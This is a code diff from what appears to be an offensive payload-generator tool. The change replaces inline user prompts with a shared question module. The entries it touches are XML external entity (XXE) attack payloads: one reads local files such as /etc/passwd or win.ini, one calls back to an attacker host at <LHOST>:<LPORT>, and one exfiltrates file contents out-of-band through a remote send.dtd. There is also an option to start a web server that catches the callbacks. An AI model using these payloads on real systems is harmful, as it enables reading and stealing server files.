@@ -7,6 +7,7 @@ var black = log.blackBright
 var green = log.green
 var red = log.red
 var M = require('mstring')
+var question = require('../modules/questionUser');
 
 var web = require("../modules/webserver.js")
 
@@ -48,18 +49,7 @@ Load({
 	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo PUBLIC 'bar' 'http://<LHOST>:<LPORT>'>",
 	category: "XML",
 	callback: function(returnToPrepare){
-		prompt.message = "Should I fire up a web server for you? (Y/n)"
-
-		prompt.get([{name: '_', description: ':'}], function(err, result){
-			result._ = result._.toUpperCase()
-			if (result._ === "Y"){
-				var server = web.init(returnToPrepare)
-			}
-			else {
-				returnToPrepare(result._)
-			}
-			
-		})
+		question.ask("Should I fire up a web server for you? (Y/n)", returnToPrepare, "web")
 	}
 })
 
@@ -70,10 +60,7 @@ Load({
 	sample: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\t<!DOCTYPE foo [ <!ENTITY bar SYSTEM \"file://<remote file path>\"> ]]&bar;>",
 	category: "XML",
 	callback: function(returnToPrepare){
-		prompt.message = "Specify a local file (/etc/passwd , C:\\Windows\\win.ini) :"
-		prompt.get([{name: '_', description: ':'}], function(err, result){
-			returnToPrepare(result._)
-		})
+		question.ask("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)", returnToPrepare, "web")
 	}
 })
 
@@ -84,10 +71,7 @@ Load({
 	sample: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\t<!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://<remote file path>\"><!ENTITY % dtd SYSTEM \"http://<lhost>:<lport>/send.dtd\">%dtd;%send; ]]>",
 	category: "XML",
 	callback: function(returnToPrepare){
-		prompt.message = "Specify a local file (/etc/passwd , C:\\Windows\\win.ini) :"
-		prompt.get([{name: '_', description: ':'}], function(err, result){
-			returnToPrepare(result._)
-		})
+		question.ask("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)", returnToPrepare, "web")
 	}
 })
 
